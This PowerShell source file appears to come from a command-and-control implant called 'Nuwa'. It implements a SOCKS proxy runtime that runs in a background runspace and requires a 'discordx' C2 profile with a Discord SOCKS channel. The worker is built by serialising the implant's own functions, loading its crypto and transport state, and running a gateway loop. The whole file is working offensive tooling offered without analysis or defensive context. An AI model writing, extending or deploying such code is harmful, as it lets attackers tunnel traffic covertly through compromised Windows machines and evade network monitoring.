function New-NuwaSocksWorkerSource {
    [CmdletBinding()]
    param()

    $functions = @(Get-ChildItem Function: | Where-Object { $_.Name -like '*-Nuwa*' } | Sort-Object Name)
    $definitions = [System.Text.StringBuilder]::new()
    [void]$definitions.AppendLine('param($Config, $State, $CryptoState, $EnvelopeState, $Shared, $ScriptVars)')
    [void]$definitions.AppendLine('$script:NuwaConfig = $Config')
    [void]$definitions.AppendLine('$script:NuwaState = $State')
    [void]$definitions.AppendLine('$script:NuwaCryptoState = $CryptoState')
    [void]$definitions.AppendLine('$script:NuwaTransportEnvelopeState = $EnvelopeState')
    [void]$definitions.AppendLine('foreach ($name in $ScriptVars.Keys) { Set-Variable -Scope Script -Name $name -Value $ScriptVars[$name] }')
    [void]$definitions.AppendLine('$script:NuwaDiscordProcessedMessageIds = @()')
    foreach ($item in $functions) {
        [void]$definitions.AppendLine(('function {0} {{' -f $item.Name))
        [void]$definitions.AppendLine([string]$item.Definition)
        [void]$definitions.AppendLine('}')
    }
    [void]$definitions.AppendLine('Invoke-NuwaSocksGatewayLoop -Shared $Shared')
    return $definitions.ToString()
}

function Start-NuwaSocksRuntime {
    [CmdletBinding()]
    param([Parameter(Mandatory = $true)][int]$Port)

    if ([string]$script:NuwaConfig.C2Profile -ne 'discordx' -or
        [string]::IsNullOrWhiteSpace([string]$script:NuwaConfig.SocksChannel)) {
        throw 'SOCKS runtime requires a configured DiscordX SOCKS channel'
    }
    if ([string]$script:NuwaConfig.PowerShellRuntime -ne 'full-language' -or
        $ExecutionContext.SessionState.LanguageMode -ne 'FullLanguage') {
        throw 'SOCKS runtime requires FullLanguage PowerShell'
    }
    Write-NuwaDebug 'SOCKS runtime validating dependencies'
    # Windows PowerShell 5.1 does not load this framework assembly until asked.
    Add-Type -AssemblyName System.Net.Http -ErrorAction Stop
    if ($null -ne $script:NuwaSocksRuntime) {
        $script:NuwaSocksRuntime.Shared.Ports[$Port] = $true
        return
    }

    Write-NuwaDebug 'SOCKS runtime creating shared state'
    $shared = [hashtable]::Synchronized(@{
        Ports = [hashtable]::Synchronized(@{ $Port = $true })
        Ready = [System.Threading.ManualResetEvent]::new($false)
        Stop = [System.Threading.ManualResetEvent]::new($false)
        Error = ''
    })
    Write-NuwaDebug 'SOCKS runtime opening worker runspace'
    $runspace = [runspacefactory]::CreateRunspace()
    $runspace.Open()
    $worker = [powershell]::Create()
    $worker.Runspace = $runspace
    Write-NuwaDebug 'SOCKS runtime rendering worker source'
    $workerSource = New-NuwaSocksWorkerSource
    Write-NuwaDebug 'SOCKS runtime collecting worker state'
    $scriptVars = @{}
    foreach ($variable in @(Get-Variable -Scope Script -Name 'Nuwa*')) {
        if ($variable.Name -in @('NuwaConfig', 'NuwaState', 'NuwaCryptoState',
                                 'NuwaTransportEnvelopeState', 'NuwaSocksRuntime')) {
            continue
        }
        $scriptVars[$variable.Name] = $variable.Value
    }
    [void]$worker.AddScript($workerSource)
    [void]$worker.AddArgument($script:NuwaConfig)
    [void]$worker.AddArgument($script:NuwaState)
    [void]$worker.AddArgument($script:NuwaCryptoState)
    [void]$worker.AddArgument($script:NuwaTransportEnvelopeState)
    [void]$worker.AddArgument($shared)
    [void]$worker.AddArgument($scriptVars)
    Write-NuwaDebug 'SOCKS runtime starting worker'
    $handle = $worker.BeginInvoke()
    $script:NuwaSocksRuntime = @{
        Shared = $shared
        Worker = $worker
        Runspace = $runspace
        Handle = $handle
    }
    Write-NuwaDebug 'SOCKS runtime waiting for Gateway readiness'
    if (-not $shared.Ready.WaitOne(30000)) {
        Write-NuwaDebug 'SOCKS runtime Gateway readiness timed out'
        $reason = if ($shared.Error) { [string]$shared.Error } else { 'Gateway readiness timed out' }
        Stop-NuwaSocksRuntime -Port $Port
        throw $reason
    }
    if ($shared.Error) {
        Write-NuwaDebug ('SOCKS runtime Gateway failed: {0}' -f [string]$shared.Error)
        $reason = [string]$shared.Error
        Stop-NuwaSocksRuntime -Port $Port
        throw $reason
    }
    Write-NuwaDebug 'SOCKS runtime Gateway ready'
}

function Stop-NuwaSocksRuntime {
    [CmdletBinding()]
    param([Parameter(Mandatory = $true)][int]$Port)

    if ($null -eq $script:NuwaSocksRuntime) {
        return
    }
    $runtime = $script:NuwaSocksRuntime
    [void]$runtime.Shared.Ports.Remove($Port)
    if ($runtime.Shared.Ports.Count -gt 0) {
        return
    }
    [void]$runtime.Shared.Stop.Set()
    for ($attempt = 0; $attempt -lt 50 -and -not $runtime.Handle.IsCompleted; $attempt += 1) {
        Start-Sleep -Milliseconds 100
    }
    if (-not $runtime.Handle.IsCompleted) {
        $runtime.Worker.Stop()
    }
    try {
        if ($runtime.Handle.IsCompleted) {
            [void]$runtime.Worker.EndInvoke($runtime.Handle)
        }
    } catch {
        Write-NuwaDebug ('SOCKS worker stopped with error: {0}' -f $_.Exception.Message)
    } finally {
        if ($script:NuwaConfig.DebugLogging) {
            foreach ($record in $runtime.Worker.Streams.Information) {
                if ($null -ne $record.MessageData -and
                    $null -ne $record.MessageData.Message) {
                    Write-Host ('[Status] {0}' -f $record.MessageData.Message)
                }
            }
        }
        $runtime.Worker.Dispose()
        $runtime.Runspace.Dispose()
        $runtime.Shared.Ready.Dispose()
        $runtime.Shared.Stop.Dispose()
        $script:NuwaSocksRuntime = $null
    }
}
